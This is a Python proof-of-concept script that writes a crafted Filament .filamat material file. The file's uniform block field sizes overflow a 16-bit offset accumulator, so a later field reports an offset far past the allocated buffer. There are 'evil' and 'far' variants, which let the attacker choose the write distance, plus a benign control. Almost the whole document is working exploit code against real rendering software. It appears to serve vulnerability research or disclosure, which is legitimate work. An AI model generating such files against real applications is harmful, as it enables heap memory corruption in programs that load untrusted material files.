#!/usr/bin/env python3
"""
Builds a minimal .filamat-shaped package containing one MAT_UIB chunk, in the exact
layout filaflat::ChunkContainer::parse() + ChunkUniformInterfaceBlock::unflatten() expect:

   chunk:  u64 type (LE) | u32 size (LE) | payload[size]
   MAT_UIB payload: cstring blockName | u64 numFields |
                    numFields x { cstring name | u64 size | u8 type | u8 precision | u8 sampler }

UniformType values are from filament/backend/include/backend/DriverEnums.h: FLOAT = 4, FLOAT4 = 7.

Three variants:
  evil    "wrap" declares 16380 FLOATs -> accumulator 44 + 65520 = 65564 -> wraps to 28
          mSize = 4 * 28 = 112 bytes, but "victim" still reports byte offset 160.
  far     "pad" 10000 / "wrap" 6390 -> "victim" reports byte offset 160000 into 112 bytes,
          demonstrating the write distance is attacker-chosen.
  benign  identical shape, "wrap" declares 100 -> no wrap, everything in bounds (control).

usage: python make_filamat.py <evil|far|benign> <outfile>
"""
import struct, sys

def char_to_64(s):
    assert len(s) == 8
    v = 0
    for i, c in enumerate(s):
        v |= ord(c) << (56 - 8 * i)
    return v

MAT_UIB = char_to_64("MAT_UIB ")
FLOAT, FLOAT4 = 4, 7

def cstr(s):
    return s.encode() + b"\0"

def field(name, size, type_):
    return cstr(name) + struct.pack("<Q", size) + bytes([type_, 0, 0])

VARIANTS = {
    "evil":   (10,    16380),
    "far":    (10000, 6390),
    "benign": (10,    100),
}

def build(pad_size, wrap_size):
    fields = (field("pad", pad_size, FLOAT)
              + field("victim", 1, FLOAT4)
              + field("wrap", wrap_size, FLOAT))
    payload = cstr("MaterialParams") + struct.pack("<Q", 3) + fields
    return struct.pack("<Q", MAT_UIB) + struct.pack("<I", len(payload)) + payload

if __name__ == "__main__":
    if len(sys.argv) != 3 or sys.argv[1] not in VARIANTS:
        sys.exit(__doc__)
    variant, out = sys.argv[1], sys.argv[2]
    pad_size, wrap_size = VARIANTS[variant]
    blob = build(pad_size, wrap_size)
    with open(out, "wb") as f:
        f.write(blob)
    print(f"wrote {out}: {len(blob)} bytes (variant={variant} pad={pad_size} wrap={wrap_size})")
